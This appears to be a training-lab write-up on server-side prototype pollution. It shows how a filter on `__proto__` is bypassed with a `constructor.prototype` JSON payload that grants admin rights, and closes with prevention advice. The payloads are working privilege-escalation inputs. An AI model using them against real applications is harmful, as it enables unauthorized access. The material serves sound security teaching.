# Server-side Prototype Pollution via Constructor

## Description

This lab demonstrates a **Server-side Prototype Pollution (SSPP)** vulnerability where the application blocks direct use of `__proto__`, but remains vulnerable through the `constructor.prototype` chain.

By injecting properties into `constructor.prototype`, an attacker can modify `Object.prototype`, causing all newly created objects to inherit attacker-controlled properties. In this lab, the vulnerability is used to escalate privileges by setting the `isAdmin` property to `true`.

---

## Steps

### 1. Log in

Login using the provided credentials:

```
Username: wiener
Password: peter
```

---

### 2. Intercept the Change Address Request

Navigate to **My Account → Change Address** and intercept the request using Burp Suite.

Original request:

```http
POST /my-account/change-address HTTP/2
Content-Type: application/json

{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"<session>"
}
```

---

### 3. Verify `__proto__` is Filtered

Attempt prototype pollution using the `__proto__` property.

```json
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"<session>",
    "__proto__":{
        "foo":"bar"
    }
}
```

The response reflects the object as a normal property (for example `__pro__proto__to__`) instead of polluting the prototype, indicating that direct `__proto__` usage is filtered.

---

### 4. Bypass the Filter Using `constructor.prototype`

Use the `constructor.prototype` chain instead.

```json
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"<session>",
    "constructor":{
        "prototype":{
            "isAdmin":true
        }
    }
}
```

The response now contains:

```json
{
    ...
    "isAdmin": true
}
```

This confirms that the server is vulnerable to prototype pollution through `constructor.prototype`.

---

### 5. Solve the Lab

After sending the request with the payload above, refresh the application or revisit the account page.

The application now treats your account as an administrator, completing the lab.

---

## Vulnerability

Although the application filters the `__proto__` property, it fails to block the equivalent prototype path:

- `constructor.prototype`

When the server recursively merges user-controlled JSON, properties supplied inside `constructor.prototype` are copied into `Object.prototype`, allowing attackers to influence every object created afterward.

---

## Impact

- Privilege escalation
- Authorization bypass
- Business logic manipulation
- Global object pollution
- Potential Remote Code Execution (framework-dependent)

---

## Prevention

- Block dangerous properties including:
  - `__proto__`
  - `constructor`
  - `prototype`
- Use secure deep-merge libraries that prevent prototype pollution.
- Validate and sanitize all user-supplied JSON before merging.
- Create objects with `Object.create(null)` where appropriate.
- Keep dependencies updated to patched versions.
